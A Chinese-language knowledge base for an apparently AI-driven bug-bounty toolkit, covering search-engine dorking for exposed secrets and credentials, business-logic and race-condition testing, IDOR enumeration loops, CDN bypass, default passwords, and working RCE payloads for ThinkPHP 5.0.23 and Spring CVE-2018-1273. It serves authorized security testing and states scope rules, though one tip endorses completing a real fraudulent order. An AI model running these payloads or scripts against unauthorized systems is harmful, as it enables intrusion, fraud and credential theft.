# Bai-codeagent 完整知识库 (know.md)

> 本文档包含：工具使用说明、SRC 漏洞挖掘方法论、Google Dorking 技巧、业务逻辑漏洞测试指南
> 适用于 Claude Code 自动化挖掘 + 人工半自动测试

---

## 目录

1. [项目架构与使用](#一项目架构与使用)
2. [Google Dorking — 搜索引擎技巧](#二google-dorking--搜索引擎技巧)
3. [业务逻辑漏洞 — 测试方法论](#三业务逻辑漏洞--测试方法论)
4. [竞态条件专项测试](#四竞态条件专项测试)
5. [防御绕过技巧](#五防御绕过技巧)
6. [实战 Checklist](#六实战-checklist)
7. [工具链速查](#七工具链速查)
8. [数据参考](#八数据参考)

---

## 一、项目架构与使用

### 组件总览

| 组件 | 路径 | 用途 |
|------|------|------|
| Web 面板 | `server.js` | 框架审计 + SRC 辅助面板 (port 3000) |
| Claude Code Skills | `claude-hunt/` | Claude Code 命令式自动化 |
| Auto-Hunt Agent | `claude-hunt/auto_agent/` | 独立 Python 全自动/半自动流程 |
| Brain (LLM 层) | `claude-hunt/brain.py` | 多 Provider LLM 推理层 |
| MCP 集成 | `claude-hunt/mcp/` | Burp/Fiddler/HackerOne 桥接 |

### Auto-Hunt Agent 使用

```bash
# 安装依赖
cd claude-hunt/auto_agent
pip install -r requirements.txt

# 配置
cp config.yaml.example config.yaml
# 编辑 config.yaml 填入 DeepSeek API Key
# 或直接设置环境变量：
export DEEPSEEK_API_KEY="sk-xxx"

# 运行
python auto_hunt.py --target example.com --mode semi   # 半自动
python auto_hunt.py --target example.com --mode auto   # 全自动
```

### Claude Code 命令

```bash
claude                          # 启动 Claude Code
/recon target.com              # 信息搜集
/hunt target.com               # 漏洞挖掘
/autopilot target.com --normal # 全自动
/validate                      # 验证漏洞
/report                        # 生成报告
/scope target.com              # 查看/设置 scope
/intel target.com              # 历史情报查询
```

### Docker 方式

```bash
cd claude-hunt/auto_agent
docker compose -f docker-compose.hunter.yml up
# 环境变量: DEEPSEEK_API_KEY=xxx
```

---

## 二、Google Dorking — 搜索引擎技巧

> 来源：InfoSec Writeups, HackerOne 实战, SRC 社区

### 2.1 找目标 / 找资产

#### 基础信息收集

```bash
# 找安全通告页面（通常有赏金计划链接）
inurl:/.well-known/security.txt

# 找暴露的配置文件
site:target.com filetype:env
site:target.com filetype:yml OR filetype:yaml

# 找备份文件
site:target.com ext:bak OR ext:old OR ext:backup OR ext:sql
site:target.com inurl:backup filetype:sql

# 找开放目录
intitle:"index of" site:target.com
intitle:"index of" "parent directory"

# 找后台/管理面板
site:target.com inurl:login OR inurl:admin OR inurl:dashboard
site:target.com intitle:"admin panel"
```

#### 找 API 端点

```bash
site:target.com inurl:api
site:target.com inurl:swagger
site:target.com inurl:graphql
site:target.com inurl:openapi.json
site:target.com inurl:"api/v1"
```

#### 找 JS 文件（可能泄露接口和参数）

```bash
site:target.com ext:js
site:target.com inurl:"app.js" OR inurl:"main.js" OR inurl:"config.js"
```

#### 找 IDOR 易感参数

```bash
site:target.com inurl:"user_id="
site:target.com inurl:"id="
site:target.com inurl:"orderId="
site:target.com inurl:"uid="
site:target.com inurl:"customerId="
```

### 2.2 找漏洞目标特征

#### 电商/支付类（逻辑漏洞高发区）

```bash
# 找电商平台
inurl:checkout OR inurl:cart OR inurl:payment
intitle:"下单" OR intitle:"提交订单"
inurl:order intitle:"订单详情"

# 找优惠券/促销页面
inurl:coupon OR inurl:promo OR inurl:discount
inurl:redeem OR inurl:invite

# 找充值/提现功能
inurl:recharge OR inurl:withdraw OR inurl:topup
intitle:"余额" OR intitle:"充值"
```

#### 账号/认证类

```bash
# 找密码重置
inurl:reset-password OR inurl:forgot-password OR inurl:forget-password

# 找注册页面
inurl:register OR inurl:signup OR inurl:sign-up

# 找验证码相关
inurl:verify OR inurl:verification OR inurl:otp
```

#### 文件上传/下载

```bash
inurl:upload OR inurl:file-upload
inurl:download OR inurl:attachment
inurl:"download.php?file=" OR inurl:"download.aspx?file="
```

### 2.3 找敏感信息泄露

#### 数据库凭证

```bash
site:target.com intext:"mysql_connect"
site:target.com intext:"DB_PASSWORD" OR intext:"DB_USER"
site:target.com intext:"jdbc:" OR intext:"connectionstring"
```

#### AWS/云凭证

```bash
site:target.com intext:"AKIA" OR intext:"ASIA"  # AWS access key
site:target.com intext:"sk_live_"                # Stripe live key
site:target.com intext:"ghp_"                     # GitHub personal token
```

#### 错误信息

```bash
site:target.com intext:"sql syntax near"
site:target.com intext:"stack trace"
site:target.com intext:"exception" intext:"line"
site:target.com intext:"fatal error"
```

### 2.4 FOFA / Shodan 辅助搜索

#### FOFA 语法（中文环境更友好）

```bash
# 找特定指纹的所有站点（批量越权挖掘）
body="技术支持：XX公司" && country="CN"
header="X-Powered-By: XXX" && type="subdomain"

# 找 Swagger UI
body="swagger-ui" && country="CN"

# 找后台管理
body="后台管理" && country="CN"
title="管理系统" && body="登录"

# 找特定路径
body="order" && title="订单"
body="userid" && type="subdomain"

# 批量找同类系统（SRC 挖洞神器）
icon_hash="xxxxxxxx"   # 计算 favicon hash，找同指纹系统
```

#### Shodan 语法

```bash
# 找暴露的 API
http.title:"swagger" country:"CN"
http.title:"API" ssl:"target.com"

# 找管理后台
http.title:"admin" country:"CN"
http.title:"login" http.component:"jquery"
```

### 2.5 Google Hacking Database (GHDB) 精选

| 类别 | Dork |
|------|------|
| 文件上传接口 | `inurl:"uploadfile" OR inurl:"fileupload"` |
| API 文档泄露 | `inurl:"swagger-ui.html" OR inurl:"api-docs"` |
| 代码仓库泄露 | `site:github.com "target.com" password OR secret OR key` |
| 内部文档 | `site:target.com filetype:pdf "internal" OR "confidential"` |
| 日志文件 | `site:target.com ext:log "error" OR "exception"` |
| 配置文件 | `site:target.com inurl:"config.php" OR inurl:"web.config"` |

### 2.6 Wayback Machine 利用

```bash
# 查看历史页面（可能暴露旧版 API、隐藏端点）
https://web.archive.org/web/*/target.com/*

# 使用 waybackurls 工具自动提取
echo "target.com" | waybackurls | grep -E "\.js$|\.json$|api|config"

# 提取所有参数
echo "target.com" | waybackurls | unfurl keys | sort -u

# 结合 gau (Get All URLs)
gau target.com | grep -E "user_id|id=|orderId|uid"
```

### 2.7 实用工具组合

```bash
# 标准工作流
subfinder -d target.com | httpx -silent | waybackurls | \
  grep -E "\.js$" | sort -u > js_files.txt

# 从 JS 中提取端点
cat js_files.txt | while read url; do
  curl -s "$url" | grep -oP '(api/[^"'"'"'\s]+|v[0-9]/[^"'"'"'\s]+)'
done | sort -u

# 找 IDOR 易感的参数
gau target.com | grep -E "\?(.*&)?(id|user_id|uid|order_id|customer_id)=" | sort -u

# 批量测试 IDOR
for id in $(seq 1 100); do
  curl -s "https://target.com/api/user/$id" -H "Cookie: session=xxx" -w "%{http_code}: $id\n"
done
```

### 2.8 Google Dork 使用注意事项

1. **合法合规**：仅对授权的 SRC 平台使用
2. **频率控制**：Google 会限制频繁搜索，需加延迟
3. **组合使用**：Google + FOFA + Shodan + Wayback Machine 多源结合
4. **先去重**：同类系统先确认一个存在漏洞，再批量利用
5. **保存证据**：发现的信息泄露页面及时截图/存档

---

## 三、业务逻辑漏洞 — 测试方法论

> 融合 OWASP WSTG、PortSwigger 研究、HackerOne 实战、国内 SRC 经验

### 3.1 逻辑漏洞分类体系（7 大类）

```
业务逻辑漏洞
├── 1. 支付/交易漏洞
│   ├── 价格篡改（前端传价、负数、小数溢出）
│   ├── 数量篡改（负数、零值、整数溢出 2147483647+1）
│   ├── 优惠券/折扣滥用（并发复用、取消退回后仍用）
│   ├── 四舍五入（分/厘单位转换时取整方向错误）
│   ├── 签约绕过（解约后再次签约套利）
│   └── 混合支付（取消订单退余额后仍完成支付）
│
├── 2. 越权漏洞 (IDOR)
│   ├── 水平越权（修改 userId/orderId 查看他人数据）
│   ├── 垂直越权（普通用户执行管理操作）
│   ├── 参数 ID 编码绕过（Base64/哈希后遍历）
│   └── GraphQL/REST API 缺少后端鉴权
│
├── 3. 竞态条件 (Race Conditions)
│   ├── 并发提现（余额 1 元，10 次并发提现）
│   ├── 并发领券（限量券同时获取多张）
│   ├── Single-Packet Attack（PortSwigger 技术）
│   └── TOCTOU（检查时 vs 使用时状态不同）
│
├── 4. 认证/会话漏洞
│   ├── 验证码爆破（4 位=10000 种，6 位=100 万种）
│   ├── 验证码与手机号不绑定
│   ├── 空 Token/验证码绕过
│   ├── 响应包篡改（false→true, -1→0）
│   ├── 第三方登录 UID 篡改
│   └── 图形验证码绕过（AI/打码平台/复用）
│
├── 5. 工作流绕过
│   ├── 跳过支付步骤直接确认订单
│   ├── 跳过验证步骤（邮箱/手机验证）
│   ├── 取消订单后仍可支付发货
│   ├── 退款后优惠券未作废
│   └── 多步骤流程步序反转
│
├── 6. 营销/活动滥用
│   ├── 新人优惠无限循环（注册→买→注销→重新注册）
│   ├── 邀请奖励刷量
│   ├── 抽奖/盲盒次数超限
│   ├── 签到/打卡并发刷积分
│   └── 限量商品超购
│
└── 7. 恶意逻辑循环 (OWASP BLA4:2025)
    ├── 无限循环（CWE-835）
    ├── 递归失控（CWE-674）
    ├── 时序炸弹（CWE-511）
    └── 未检查的循环条件（CWE-606）
```

### 3.2 测试四阶段

#### Phase 1: 侦察与映射

```
目标：完整理解业务流程
```

1. **正常走完所有业务流程**，全程抓包（Fiddler / Burp）
2. **建立接口清单**：
   - 注册/登录/注销
   - 密码重置/手机绑定/邮箱验证
   - 商品浏览/搜索/加入购物车
   - 下单/支付/退款
   - 优惠券领取/使用
   - 个人资料查看/修改
   - 订单管理/地址管理
   - 评论/反馈/客服
3. **识别参数**：每个接口中与业务逻辑相关的参数
4. **理解业务规则**：
   - "每个用户只能领一次新人券"
   - "单笔订单金额不能为负"
   - "优惠券使用后作废"
   - "订单取消后 5 分钟内可恢复"

#### Phase 2: 对抗性思维（"反过来想想"）

**时间维度**：
- 能不能把操作拖到某个有利时机再完成？
- 大促价格变动时取消再恢复支付？
- 优惠券快过期时利用时间窗口？

**顺序维度**：
- 跳过步骤 2 直接做步骤 4 会怎样？
- 先做步骤 3 再回到步骤 1？
- 同时执行两个互斥操作？

**数量维度**：
- 负数行不行？（-1 个商品）
- 零行不行？（0 元支付）
- 小数行不行？（0.001 元）
- 超大数行不行？（整数溢出）
- 超过限制次数行不行？

**身份维度**：
- 用 A 的 ID 看 B 的数据？
- 普通用户调管理员接口？
- 修改请求中的角色字段？
- 注销后重新注册拿新人优惠？

**金额维度**：
- 前端传的价格改了后端认不认？
- 多币种切换时汇率取整方向？
- 退款金额大于支付金额？
- 运费/税费单独篡改？

#### Phase 3: 参数篡改与测试

**测试矩阵**：

| 参数类型 | 测试值列表 |
|----------|-----------|
| price / amount / total | `0`, `-1`, `0.01`, `99999999`, `""`, `null`, `NaN` |
| quantity / qty | `-1`, `0`, `2147483647`, `2147483648`, `-999` |
| userId / orderId / *Id | 遍历 ±1, ±100, 随机值 |
| role / type / status | `admin`, `superadmin`, `1`, `true`, 空值 |
| couponCode / promoCode | 空值、已用过的码、他人码 |
| token / verifyCode | 空值、固定值、过期值 |

#### Phase 4: 利用与报告

1. **验证影响**：不能仅停留在"参数可改"，要展示实际危害
2. **链式组合**：中低危组合成高危（如信息泄露 + 认证绕过 = 任意账号接管）
3. **录屏证据**：最直观的漏洞证明
4. **量化损失**：能泄露多少用户？能造成多少经济损失？

---

## 四、竞态条件专项测试

### 工具选择

| 工具 | 用途 | 推荐场景 |
|------|------|----------|
| **Turbo Intruder** (Burp 插件) | Single-Packet Attack | 精确控制并发的时间窗口 |
| **GNU parallel** | Shell 级并发 | 快速验证 |
| **Fiddler AutoResponder** | 批量拦截+放行 | Windows 环境 |
| **自定义 Python 脚本** | 灵活控制 | 复杂逻辑 |

### 测试步骤

```
1. 确认目标操作有"次数/金额限制"
2. 抓取该操作的完整请求
3. 准备并发环境（确保所有请求几乎同时到达）
4. 发送 10-50 个并发请求
5. 观察结果：有几个成功了？资源只扣了一次还是多次？
```

### 经典测试目标

- 提现 / 转账
- 优惠券 / 礼品卡兑换
- 限量抢购
- 每日签到 / 打卡
- 抽奖 / 盲盒
- 点赞 / 投票

### Single-Packet Attack（PortSwigger 技术）

```
原理：将多个 HTTP 请求打包到单个 TCP 包中发送，
      绕过服务器端的逐请求处理延迟。

工具：Turbo Intruder (Burp Suite)
关键参数：engine=Engine.BURP2（使用 Burp 的 HTTP/2 引擎）
```

### 竞态条件测试命令

```bash
# 方式一：GNU parallel
seq 20 | parallel -j 20 "curl -s -X POST https://target.com/api/redeem \
  -H 'Content-Type: application/json' \
  -H 'Cookie: session=xxx' \
  -d '{\"coupon_code\":\"CODE123\"}'"

# 方式二：Python 并发脚本
python3 -c "
import concurrent.futures, requests
def send():
    return requests.post('https://target.com/api/redeem',
        json={'coupon_code':'CODE123'},
        headers={'Cookie':'session=xxx'}).status_code
with concurrent.futures.ThreadPoolExecutor(max_workers=20) as ex:
    results = list(ex.map(lambda _: send(), range(20)))
print(f'Success: {results.count(200)}/20')
"
```

---

## 五、防御绕过技巧

### 5.1 前端校验绕过

一切前端校验都可以通过抓包修改绕过。关键问题：**后端有没有重新校验？**

### 5.2 ID 编码绕过

- Base64 编码的 ID → 解码修改后重新 Base64 编码
- 哈希后的 ID → 尝试彩虹表或已知值
- UUID → 尝试在响应中搜索 UUID 规律

### 5.3 403/401 绕过

- 修改 HTTP 方法（POST → GET → PUT）
- 添加/删除请求头（X-Forwarded-For, X-Original-URL）
- 路径穿越：`/admin/users` → `/users;/admin/users`
- 参数污染：`?userId=自己&userId=他人`

### 5.4 WAF 绕过（业务逻辑场景）

- 请求体格式切换（JSON → XML → form-data）
- 字符编码（Unicode 等价字符、大小写混用）
- 分块传输

---

## 六、实战 Checklist

> 来源：OWASP WSTG + PortSwigger Labs + SRC 实战

```
□ 价格/金额字段篡改测试
□ 数量字段边界值测试（负数/零/超限）
□ 订单 ID 遍历（水平越权）
□ 用户 ID 遍历（水平越权）
□ 修改角色/权限参数
□ 并发领券/并发提现（竞态条件）
□ 跳过支付步骤直接确认
□ 取消订单后再次支付
□ 退款后优惠券是否作废
□ 混合支付取消后余额退回
□ 验证码与手机号绑定测试
□ 验证码爆破（无频率限制）
□ 空验证码/Token 绕过
□ 响应包篡改（false→true）
□ 第三方登录 UID 篡改
□ 注销后重新注册拿新人优惠
□ 邀请链接参数篡改
□ API 接口缺少后端鉴权（GraphQL/REST）
□ 批量操作无频率限制
□ 文件上传接口 SSRF 触发点
```

---

## 七、工具链速查

| 工具 | 用途 | 下载/安装 |
|------|------|-----------|
| Burp Suite Pro | 拦截代理+自动化扫描 | https://portswigger.net/burp |
| Turbo Intruder | 竞态条件并发测试 | Burp BApp Store |
| OWASP ZAP | 免费拦截代理 | https://www.zaproxy.org |
| Fiddler Classic | Windows 抓包（免费） | https://www.telerik.com/fiddler |
| ffuf | 模糊测试 | `go install github.com/ffuf/ffuf/v2@latest` |
| GNU parallel | Shell 并发 | `apt install parallel` / `brew install parallel` |
| subfinder | 子域名枚举 | `go install github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest` |
| httpx | HTTP 存活探测 | `go install github.com/projectdiscovery/httpx/cmd/httpx@latest` |
| nuclei | 漏洞扫描 | `go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest` |
| dalfox | XSS 检测 | `go install github.com/hahwul/dalfox/v2@latest` |
| gau | URL 收集 | `go install github.com/lc/gau/v2/cmd/gau@latest` |
| waybackurls | Wayback URL | `go install github.com/tomnomnom/waybackurls@latest` |
| trufflehog | 密钥泄露扫描 | `go install github.com/trufflesecurity/trufflehog/v3@latest` |
| arjun | 参数发现 | `pip install arjun` |
| paramspider | 被动参数发现 | `pip install paramspider` |

### IDOR 批量测试

```bash
# 遍历用户 ID
for i in $(seq 1 1000); do
  code=$(curl -s -o /dev/null -w "%{http_code}" \
    "https://target.com/api/user/$i" \
    -H "Cookie: session=xxx")
  [ "$code" = "200" ] && echo "Found: user $i"
done
```

---

## 八、数据参考

### HackerOne 2024-2025 报告关键数据

| 指标 | 数据 |
|------|------|
| 业务逻辑错误年增长率 | +67% |
| 在所有漏洞中占比 | ~2%（Top 10） |
| 加密/区块链项目占比 | ~10% |
| 加密项目赏金占总支出 | 45% |
| 最高单笔赏金 | 加密项目 95 分位达 $1M |
| AI 漏掉业务逻辑漏洞 | 58% 研究员认同 |

### 国内 SRC 赏金参考

| 级别 | 赏金范围（人民币） |
|------|-------------------|
| 严重 | 5,000 ~ 20,000 元 |
| 高危 | 1,000 ~ 5,000 元 |
| 中危 | 200 ~ 1,000 元 |
| 低危 | 50 ~ 200 元 |

---

## 九、红线规则（绝对不碰）

1. **不破坏数据** — 不删除、不修改生产数据
2. **不泄露数据** — 发现敏感数据立即停止，不扩大影响
3. **不越权操作** — 只验证存在性，不实际利用
4. **不攻击非授权目标** — 严格在 scope 内
5. **不使用 sqlmap 等自动化注入** — 国内 SRC 实名制，流量异常会追溯
6. **不碰 `.gov.cn` / `.edu.cn`** — 除非明确有 SRC 授权
7. **不碰支付相关的删除/修改操作** — 只读验证
8. **发现高危立即暂停** — 等人工确认后再继续

---

*最后更新：2025-06*



---

## 十、信息搜集实战技术

### 10.1 子域名枚举与域名活性检测

```bash
# ffuf 子域名爆破（vhost 方式）
ffuf -w /usr/share/dnsrecon/subdomains-top1mil-5000.txt \
  -u https://www.4399.com/ -H "Host:FUZZ.4399.com" -mc 200

# ffuf 子域名拼接方式
ffuf -w /usr/share/dnsrecon/subdomains-top1mil-5000.txt \
  -u https://sso-FUZZ.baidu.com -c -t 50 -mc all -fs 42

# httpx 批量检测域名活性
httpx -l websites.txt > alive.txt

# EHole 指纹扫描（识别资产指纹/框架）
EHole finger -l websites.txt
```

### 10.2 CDN 绕过方法大全

CDN 会隐藏真实 IP，以下是绕过方法：

| 方法 | 原理 | 操作 |
|------|------|------|
| DNS 历史记录 | 运维时可能暴露过真实 IP | netcraft/viewdns/微步在线 |
| 子域名 ping | 子域名可能没挂 CDN | ping sub.target.com |
| 国外 ping | CDN 防护有地域范围 | ping.chinaz.com 国际测速 |
| 邮件回信 | 主站发出的邮件暴露真实 IP | 诱导目标发邮件，查看邮件原文 |
| phpinfo | 页面可能泄露 SERVER_ADDR | 找 phpinfo 页面 |
| SSL 证书 | 证书关联 IP | crt.sh + censys 反查 |
| 手机 APP | APP 可能不走 CDN | 抓 APP 包看 IP |
| 小程序 | 小程序接口可能暴露 IP | 抓小程序请求 |
| DDOS 打爆 CDN | CDN 放弃保护暴露真实 IP | 压力测试（需授权） |
| F5 LTM 解码 | Set-Cookie 包含编码后的 IP | 见下方解码方法 |
| 全网扫描 | 扫描匹配目标指纹 | hackcdn / w8fuckcdn |

#### F5 LTM 解码法

```
Set-Cookie: BIGipServerpool_8.29_8030=487098378.24095.0000

步骤：
1. 取第一节十进制数: 487098378
2. 转十六进制: 1d08880a
3. 从后往前每两位分割: 0a.88.08.1d
4. 各段转十进制: 10.136.8.29 ← 真实 IP
```

#### 找到真实 IP 后

修改本地 hosts 文件，将域名指向真实 IP 绕过 CDN 防护：
```
# Windows: C:\Windows\system32\drivers\etc\hosts
# Linux: /etc/hosts
真实IP  target.com
```

### 10.3 网站结构分析

| 文件/目录 | 作用 | 安全风险 |
|-----------|------|----------|
| `robots.txt` | 搜索引擎爬取规则 | 暴露后台路径、敏感目录 |
| `conf/` / `config/` | 网站配置（数据库连接等） | 数据库账密泄露 |
| `data/` / `db/` | 数据文件、备份 | 数据库备份下载 |
| `install/` | 安装目录 | 删除 install.lock 可重装 |
| `source/` / `plugin/` | 源码和插件 | 漏洞高发区（审计盲区） |
| `static/` | 静态文件(css/js/图片) | JS 中可能泄露接口 |
| `template/` | 前端模板 | 一般无风险 |
| `admin.php` | 后台入口 | 爆破/默认口令 |

### 10.4 文件泄露漏洞类型

| 泄露类型 | 路径特征 | 利用方式 |
|----------|---------|---------|
| 备份文件 | `*.zip`, `*.rar`, `*.bak`, `*.sql`, `*.tar.gz` | 直接下载获取源码/数据库 |
| 编辑器备份 | `*.php.bak`, `*.phps`, `*.swp` | 下载获取源码 |
| Git 泄露 | `/.git/config` | githack 恢复整站源码 |
| SVN 泄露 | `/.svn/entries` | dvcs-ripper 恢复 |
| DS_Store | `/.DS_Store` | macOS 文件索引泄露目录结构 |
| install.lock | `/data/install.lock` | 删除后可重装网站 |

---

## 十一、端口与服务攻击

### 常见端口及攻击方式

| 端口 | 服务 | 攻击方式 |
|------|------|---------|
| 21 | FTP | 爆破 / 匿名登录(anonymous) |
| 22 | SSH | 爆破 / 密钥泄露 |
| 23 | Telnet | 爆破（九头蛇） |
| 25 | SMTP | 钓鱼邮件 |
| 53 | DNS | 域传送 / DNS 劫持 |
| 80/443 | HTTP/S | Web 漏洞 |
| 135+445 | SMB | 永恒之蓝(MS17-010) |
| 1433 | MSSQL | 爆破 / xp_cmdshell |
| 2375/2376 | Docker | 未授权 / 逃逸 |
| 3000 | Grafana | 默认口令 admin/admin |
| 3306 | MySQL | 爆破 / UDF提权 |
| 3389 | RDP | 爆破远程桌面 |
| 6379 | Redis | 未授权写 webshell |
| 8080 | Tomcat | 默认口令 / 部署 war |
| 27017 | MongoDB | 未授权访问 |
| 873 | Rsync | 未授权同步 |

### nmap 常用命令

```bash
# 基础全面扫描
nmap -p- -T4 -A -v 目标IP

# 隐蔽扫描（不建立 TCP 连接，不留日志）
nmap -sS 目标IP

# 指定端口
nmap -p 80,443,3389,3306,6379 目标IP

# 扫描网段
nmap -sL 192.168.1.0/24

# Ping 扫描（主机发现）
nmap -sn 192.168.1.0/24

# 跳过 Ping 直接扫描
nmap -Pn 目标IP

# UDP 扫描
nmap -sU 目标IP

# 操作系统识别
nmap -O 目标IP
```

---

## 十二、登录口攻击方法

### 12.1 弱口令爆破

**常见默认口令：**

| 系统/设备 | 用户名 | 密码 |
|-----------|--------|------|
| k8s 控制台 | admin | P@88w0rd |
| Zabbix | admin | zabbix |
| Grafana | admin | admin |
| Nacos | nacos | nacos |
| Tomcat | tomcat / admin | tomcat / admin |
| ActiveMQ | admin | admin |
| WebLogic | weblogic | weblogic |
| RabbitMQ | admin / guest | guest |
| GitLab | root | 可爆破 |
| Druid | admin | 123456 |
| 若依 | admin | admin123 |
| 酒店系统 | admin | 000000 / 888888 / 00000000 / 88888888 |

**常用密码字典关键词：** `qwert`, `admin`, `root`, `test`, `password`, `secret`, `000000`, `123456`

### 12.2 验证码绕过

| 方法 | 场景 |
|------|------|
| AI OCR 识别 | 简单字符验证码用 pytesseract |
| 打码平台 | 复杂验证码用云码等人工打码 |
| 滑块自动化 | pyautogui 模拟鼠标拖拽 |
| 验证码复用 | 抓包发现验证码不过期/不刷新 |
| 删除验证码参数 | 请求中去掉验证码字段看后端是否校验 |
| 万能验证码 | 某些系统有测试用 `0000` / `1234` |

### 12.3 短信验证码漏洞

| 漏洞类型 | 利用方式 |
|----------|---------|
| 响应包泄露 | 抓 response 包，验证码直接在返回数据中 |
| 验证码爆破 | 4位=10000种，无频率限制时可爆破 |
| 手机号不绑定 | 用 A 手机收验证码，注册写 B 手机号 |
| 修改返回包 | `false→true`、`-1→0`、`error→success` |
| 验证码为空 | 传 `null` 或空值绕过 |
| 第三方登录篡改 | 修改微博/QQ 返回的 UID 越权登录 |
| 短信轰炸 | 注册/注销/重置接口无频率限制 |

### 12.4 任意用户漏洞

测试点：**注册、登录、密码重置、注销** — 四个口都要试

- 密码重置链接可预测
- 通用框架 nday 漏洞（很多公司不升级）
- SQL 注入万能密码：`' or 1=1--`

---

## 十三、框架漏洞速查

### PHP 框架

| 框架 | 经典漏洞 | 版本 |
|------|---------|------|
| ThinkPHP | RCE | 5.0.23（最经典） |
| Laravel | 反序列化 | 多版本 |
| Discuz | 越权/注入 | X3.x |

**ThinkPHP 5.0.23 RCE payload:**
```
_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=whoami
```

### Java 框架

| 框架 | 经典漏洞 | 特征 |
|------|---------|------|
| Struts2 | OGNL RCE | Content-Type 注入 |
| Spring | SpEL RCE | `/users` 路径 |
| Shiro | 反序列化 | `rememberMe=` Cookie |
| Swagger | 接口暴露 | `/swagger-ui.html` |

**Spring Data Commons RCE (CVE-2018-1273):**
```
username=[#this.getClass().forName("java.lang.Runtime").getRuntime().exec("id")]&password=&repeatedPassword=
```

**Shiro 指纹识别：** 响应包中出现 `rememberMe=deleteMe`

### 判断网站语言

在 URL 后加后缀测试：
- `index.php` → PHP
- `index.asp` / `index.aspx` → ASP/.NET
- `index.jsp` → Java
- 无后缀但有 `/api/` → 可能是 Go/Python/Node

---

## 十四、云安全与 Key 泄露

### 云服务鉴权字段

| 字段 | 位置 |
|------|------|
| Cookie | 请求头 |
| Authorization | 请求头 (Bearer token) |
| X-API-Key / Api-Key | 请求头 |
| AccessKeyId + SecretKey | 阿里云/AWS/腾讯云 |

### Key 泄露搜集

```bash
# GitHub 搜索
site:github.com "AccessKeyId" "target公司名"
site:github.com "AKIA" "target.com"  # AWS Key 前缀

# 源码/JS 中搜索
grep -rn "AccessKey\|SecretKey\|AKIA\|sk_live_" ./

# 利用方式
# 拿到 AK/SK 后可以登录对象存储(OSS)、控制 ECS 等
```

### 常见云安全问题

| 问题 | 危害 |
|------|------|
| Bucket 权限配置为公共读写 | 任意上传/下载文件 |
| AccessKey 泄露 | 控制整个云账户 |
| 任意文件上传到 OSS | 挂马/钓鱼 |
| 元数据 SSRF | `169.254.169.254` 获取临时凭证 |

---

## 十五、Kali/Parrot 工具参考

### WAF 识别
```bash
wafw00f http://www.target.com
```

### CMS 识别
```bash
whatweb http://www.target.com
```

### 漏洞扫描器

| 工具 | 用途 | 注意 |
|------|------|------|
| AWVS | Web 漏洞扫描 | 需要授权，流量大 |
| Nessus | 主机/网络漏洞扫描 | 适合内网 |
| Nuclei | 模板化扫描 | 开源免费，推荐 |

### 漏洞环境搭建

```bash
# Vulhub — 经典漏洞 Docker 环境
git clone https://github.com/vulhub/vulhub.git
cd vulhub/struts2/s2-045
docker compose up -d
```

---

## 十六、DNS 记录类型

| 记录类型 | 作用 |
|----------|------|
| A | 域名 → IPv4 |
| AAAA | 域名 → IPv6 |
| CNAME | 域名 → 另一个域名 |
| MX | 邮件服务器 |
| NS | 权威 DNS 服务器 |
| TXT | 验证信息(SPF/DKIM/DMARC) |

---

## 十七、SRC 实战经验总结

### 高价值目标优先级

1. **支付/钱包** — 开发者 shortcuts 最多的地方
2. **优惠券/积分** — 并发竞态+逻辑绕过
3. **用户中心** — IDOR 水平越权
4. **管理后台** — 垂直越权 + 弱口令
5. **API 接口** — 未授权 + 参数篡改
6. **文件上传** — getshell
7. **密码重置** — 任意用户密码重置

### 效率策略

- **5 分钟规则** — 没进展就换目标
- **兄弟接口** — 一个有洞旁边大概率也有
- **20 分钟轮换** — 定期问自己"有进展吗？"
- **深度优于广度** — 一个吃透 > 十个浅试
- **跟着钱走** — 支付相关是高危重灾区

### 注意事项补充

- 有的挖到 0 元购（积分），目标觉得有风控不承认 → 发一次货再提交证明风控无效
- 注销功能也可能存在短信轰炸
- 众测平台养号很重要（漏洞盒子金融项目需要）
- 补天专属 SRC 可以挖 gov 类
- CNVD + CVE 可以双提交（一洞两吃）

---

*最后更新：2025-06*



---

## 十八、CVE / CNVD 漏洞挖掘指南

### 18.1 CVE vs CNVD 区别

| | CVE | CNVD |
|---|---|---|
| 提交地址 | https://cveform.mitre.org | https://www.cnvd.org.cn |
| 语言 | 英文 | 中文 |
| 适用范围 | 全球通用软件 | 国内重点行业(运营商/国企/资产>5000万) |
| 审核周期 | 1-4 周 | 3-15 工作日 |
| 产出 | CVE-20XX-XXXXX 编号 | CNVD-20XX-XXXXX 编号 |
| 价值 | 国际认可/简历加分 | 国内证书/评级加分 |

**一洞两吃：** 同一个通用漏洞可以同时提交 CVE + CNVD，两个体系互不冲突。

### 18.2 什么漏洞能报 CNVD

- 通用型漏洞（开源 CMS/框架，不是某个特定网站的洞）
- 影响大型运营商、国企事业单位、机关部门
- 目标企业资产大于 5000 万
- 有明确影响面（FOFA 能搜到受影响资产）

### 18.3 CVE/CNVD 挖掘工作流

```
1. 选目标（从 cms_targets.yaml 选或自己找 GitHub 项目）
   ↓
2. Clone 源码到本地
   ↓
3. AI 代码审计（code_auditor.py 自动扫描危险函数）
   ↓
4. 本地搭建环境验证（Docker / phpStudy）
   ↓
5. 生成 PoC（poc_generator.py）
   ↓
6. FOFA 统计影响面（asset_counter.py）
   ↓
7. 生成双报告:
   - 英文 → 提交 MITRE 拿 CVE
   - 中文 → 提交 CNVD 拿编号
   ↓
8. (可选) 写 nuclei 模板 → 加入自己模板库
   ↓
9. (可选) FOFA 找使用该系统的企业 → 报对应 SRC 拿赏金
```

### 18.4 使用 cve_hunter.py

```bash
# 列出推荐审计目标
python3 claude-hunt/tools/cve_hunter.py --list

# 指定 GitHub 仓库审计
python3 claude-hunt/tools/cve_hunter.py --repo https://github.com/xxx/cms

# 审计本地源码
python3 claude-hunt/tools/cve_hunter.py --local /path/to/code --lang php

# 完整流程（审计 + PoC + 资产统计 + 双报告）
python3 claude-hunt/tools/cve_hunter.py --repo URL --full
```

### 18.5 最容易出 CVE 的目标

| 类型 | 为什么容易 | 关注点 |
|------|-----------|--------|
| 国产 PHP CMS | 代码质量低、审计少 | SQL注入/文件上传/RCE |
| OA 系统 | 功能复杂接口多 | 越权/反序列化/SSRF |
| Java 后台框架 | Shiro/FastJSON/Log4j 组件 | 反序列化/JNDI/SpEL |
| Python Web 项目 | SSTI/Pickle 反序列化 | 模板注入/命令执行 |
| 物联网固件 | 硬编码密码/命令注入 | RCE/信息泄露 |
| star 100-5000 的项目 | 没人审计过 | 各种基础漏洞 |

### 18.6 代码审计关注的危险函数

| 语言 | 危险函数/模式 | 漏洞类型 |
|------|-------------|---------|
